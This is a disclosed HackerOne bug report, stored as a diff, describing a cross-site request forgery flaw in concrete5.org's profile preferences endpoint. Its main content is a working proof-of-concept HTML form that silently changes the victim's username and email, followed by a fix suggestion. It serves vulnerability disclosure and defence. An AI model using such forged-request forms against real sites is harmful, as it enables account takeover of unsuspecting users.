@@ -1,0 +1,33 @@
+ReportLink:https://hackerone.com/reports/152052
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/khalidamin
+ReportedTo:concrete5(concrete5)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:12.08.2016 22:02:46
+
+Summary:
+
+Try this code in your browser:
+
+<html>
+  <body>
+    <form action="https://www.concrete5.org/profile/preferences/-/save/" method="POST">
+      <input type="hidden" name="uName" value="user5on" />
+      <input type="hidden" name="uEmail" value="khalidamin21&#64;yahoo&#46;com" />
+      <input type="hidden" name="uAccountType" value="owner" />
+      <input type="hidden" name="profile&#95;private&#95;messages&#95;notification&#95;enabled" value="1" />
+      <input type="hidden" name="uPasswordOld" value="" />
+      <input type="hidden" name="uPasswordNew" value="" />
+      <input type="hidden" name="uPasswordNewConfirm" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+You need to ask for confirming password for changing settings, or use a token everytime it is changed.
+
+If any further information is needed, plase ask.
+
+Thanks.
